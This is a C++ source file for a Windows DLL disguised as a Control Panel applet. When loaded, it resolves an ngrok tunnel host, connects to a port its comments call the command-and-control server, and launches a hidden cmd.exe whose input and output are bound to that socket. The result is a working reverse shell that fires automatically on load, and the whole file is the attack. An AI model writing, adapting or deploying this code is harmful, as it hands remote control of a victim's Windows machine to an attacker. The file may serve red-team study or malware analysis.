#include <Windows.h>
#include <sstream>
#include <string.h>
#include <iostream>
#include <TlHelp32.h>
#include "pch.h"
#include <ws2tcpip.h>
#include <windows.h>
#include <string>
#pragma comment(lib, "ws2_32") // Point the linker to ws2_lib library 

int iplookup(char* domain, char* ip, size_t ip_size)
{
    struct addrinfo hints;
    struct addrinfo* result = NULL;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    int status = getaddrinfo(domain, NULL, &hints, &result);

    if (status != 0)
    {
        printf("getaddrinfo failed: %d\n", status);
        return 0;
    }

    struct sockaddr_in* addr =
        (struct sockaddr_in*)result->ai_addr;

    if (inet_ntop(AF_INET, &addr->sin_addr, ip, ip_size) == NULL)
    {
        printf("inet_ntop failed\n");
        freeaddrinfo(result);
        return 0;
    }

    freeaddrinfo(result);
    return 1;
}

//Cplapplet
LONG Cplapplet(HWND hwndCpl, UINT msg, LPARAM lParam1, LPARAM lParam2)
{    
    WSADATA wsaData;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        printf("WSAStartup failed\n");
        return 1;
    }

    char domain_name[] = "0.tcp.ap.ngrok.io";
    char server_ip[INET_ADDRSTRLEN];
    iplookup(domain_name, server_ip, sizeof(server_ip));

    int server_port = 26306;        // Command and control listening server PORT
    std::string str = "cmd.exe";
    LPSTR s = const_cast<char*>(str.c_str());

    SOCKET sock; // The socket itself that is going to be used
    struct sockaddr_in server; // a structure that contains the socket's options (ip,port,address family,...)
    STARTUPINFOA si = { 0 }; // Startup info structure of the socket regarding starting from a new window or something...
    PROCESS_INFORMATION pi;  // process information structure related to the command line process

    sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); // Create the socket
    server.sin_family = AF_INET; // set the server net family to IPv4
    inet_pton(AF_INET, server_ip, &server.sin_addr.s_addr); // converts text format of the server IP to binary and assign it to the server structure 
    server.sin_port = htons(server_port); // server port to communicate with
    WSAConnect(sock, (const PSOCKADDR)&server, sizeof(server), NULL, NULL, NULL, NULL); // Create the socket connection
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock; // create I/O handlers for the open socket
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW); /*
                * Assigning flags to the startup of the socket
                * STARTF_USESTDHANDLES tells the system to use standard I/O handlers
                * in this case these handles are si.hStdInput, si.hStdOutput and si.hStdError
                * STARTF_USESHOWWINDOW sets the flag for the show window option which will later be set to hidden
                */
    si.wShowWindow = SW_HIDE; // Set the window visibility of the socket instatnce to hidden
    CreateProcessA(NULL,   // Application path name if specified
        s, // cmdlet to be executed directly from a command line instance
        NULL,  // security attributes for the process that define if the handle can be inherited. In this case no
        NULL,  // security attributes for the thread that define if the handle can be inherited. In this case no
        TRUE,  // each inheritable handle in the calling process is inherited by the new process
        CREATE_NEW_CONSOLE, // Create a new console window for that process
        NULL,  // the new process uses the environment of the calling process
        NULL,  // he new process will have the same current drive and directory as the calling process
        &si,   // pointer to the STARTUPINFO structure
        &pi  // pointer to the  PROCESS_INFORMATION structure
    );
    return 1;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        Cplapplet(NULL, NULL, NULL, NULL);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
